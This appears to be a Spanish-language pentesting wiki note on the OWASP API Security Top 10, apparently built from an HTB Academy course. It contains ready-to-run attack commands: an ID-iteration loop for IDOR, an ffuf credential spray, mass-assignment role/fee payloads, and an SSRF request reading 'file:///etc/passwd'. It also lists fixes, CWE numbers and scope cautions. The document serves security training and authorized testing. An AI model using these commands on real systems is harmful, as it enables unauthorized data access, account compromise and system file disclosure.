---
title: API Attacks (OWASP API Security Top 10)
slug: api-attacks
category: techniques
updated: 2026-08-20
summary: "OWASP API Top 10: BOLA/IDOR (iterar ID→mass abuse), Broken Auth (spray sin rate-limit), BOPLA (excessive data + mass assignment isExempt/role), BFLA (endpoint sin role check), SSRF (file:// URI)"
tags: [web, api, owasp-api, bola, idor, bfla, mass-assignment, ssrf, jwt]
sensitive: false
---

# API Attacks (OWASP API Security Top 10)

## When to use
API REST (a menudo con Swagger/`/docs`, JWT). Metodología: autenticarse, listar
roles (`/roles/current-user`), y probar cada endpoint contra su check de authz.
Hub: [[web-app-attacks]]. Descubrimiento: [[web-fuzzing]].

## Flujo base
```bash
# 1. Login → JWT:  POST /api/v1/authentication/{customers|suppliers}/sign-in
# 2. Ver identidad y roles:  GET /api/v1/{...}/current-user  ,  GET /api/v1/roles/current-user
# 3. Mapear endpoints (Swagger) y cruzar cada uno contra los roles que tenés
```

## API1 — BOLA / IDOR (Broken Object Level Authorization)
Endpoint autorizado pero sin verificar **propiedad** del objeto. Cambiar el ID (int o GUID) → datos ajenos.
```bash
# Mass-abuse: iterar el ID sobre un endpoint que devuelve por ID
for ((i=1;i<=20;i++)); do
  curl -s -w "\n" -X GET "http://T/api/v1/supplier-companies/yearly-reports/$i" \
    -H "Authorization: Bearer $JWT" | jq; done
```
Fix: comparar `object.ownerID == token.ownerID`. CWE-639.

## API2 — Broken Authentication
Sin rate-limit / política de password débil → spray de credenciales.
```bash
# Descubrir el mensaje de fallo ("Invalid Credentials"), luego ffuf 2 wordlists (email+pass):
ffuf -w passwords.txt:PASS -w emails.txt:EMAIL -X POST \
  -u http://T/api/v1/authentication/customers/sign-in \
  -H "Content-Type: application/json" -d '{"Email":"EMAIL","Password":"PASS"}' -fr "Invalid Credentials" -t 100
```
También brute-force de OTP / preguntas de seguridad (baja entropía, sin rate-limit). **Spray = brute-force → prohibido por defecto**, requiere aprobación nombrada + throttle/lockout (ver [[scope]], [[password-spray]]).

## API3 — BOPLA (Broken Object Property Level Authorization)
- **Excessive Data Exposure**: el endpoint devuelve campos sensibles que el rol no debería ver (`email`, `phoneNumber`, `birthDate`). CWE-213. Fix: DTO de respuesta.
- **Mass Assignment**: enviar campos que no deberías poder setear (`isExemptedFromMarketplaceFee:1`, `role:admin`, `active:true`) en un PATCH/POST → privesc / abuso. CWE-915. Fix: DTO de request.
```json
PATCH /api/v1/supplier-companies  { "isExemptedFromMarketplaceFee": 1 }
```

## API5 — BFLA (Broken Function Level Authorization)
Endpoint que **requiere** un rol pero no lo verifica → invocarlo sin el rol funciona. (Diferencia con BOLA: aquí el usuario NO está autorizado al endpoint.)
```
GET /api/v1/products/discounts    # requiere ProductDiscounts_GetAll, pero responde sin rol
```
Pegar endpoints admin de Swagger directo, ignorando el rol del JWT. CWE-200.

## API6 — Unrestricted Access to Sensitive Business Flows
Exponer un flujo de negocio sin límites (fechas/tasas de descuento vía BFLA) + sin rate-limit en compra → comprar todo el stock en descuento y revender. Fix: access control + rate-limit del flujo.

## API7 — SSRF
Input controlado usado para fetch de recurso sin validar → apuntar a recursos locales.
```
# Subir cert → devuelve fileURI (file:// scheme). Mass-assignment del campo CertificateOfIncorporationPDFFileURI:
PATCH /api/v1/supplier-companies  { "CertificateOfIncorporationPDFFileURI": "file:///etc/passwd" }
GET  /api/v1/supplier-companies/{ID}/certificates-of-incorporation   # devuelve /etc/passwd en base64
```
CWE-918. Ver [[server-side-attacks]] para gopher/blind SSRF.

## API8/9/10 (resumen)
- **API8 Security Misconfiguration**: headers/CORS/errores verbosos/métodos HTTP de más.
- **API9 Improper Inventory Management**: versiones viejas (`/api/v1` vs `/v2`), endpoints de staging/debug sin proteger, docs expuestas.
- **API10 Unsafe Consumption of APIs**: confiar ciegamente en APIs de 3ros que la app consume (inyección vía la respuesta del 3ro).

## Gotchas
- El JWT lleva los roles en claims (base64) — decodificarlo (jwt.io self-host / `cut -d. -f2 | base64 -d`) revela el modelo de authz sin tocar el server.
- Un endpoint interno alcanzado vía SSRF/IDOR sigue estando fuera de scope hasta re-autorizar.

## References
- Relacionado: [[web-app-attacks]], [[graphql-attacks]], [[server-side-attacks]], [[web-fuzzing]], [[password-spray]]
- OWASP API Security Top 10 (2023). Curso CWES Bug Bounty → 03-WEB → "API Attacks" (HTB Academy). Notion.
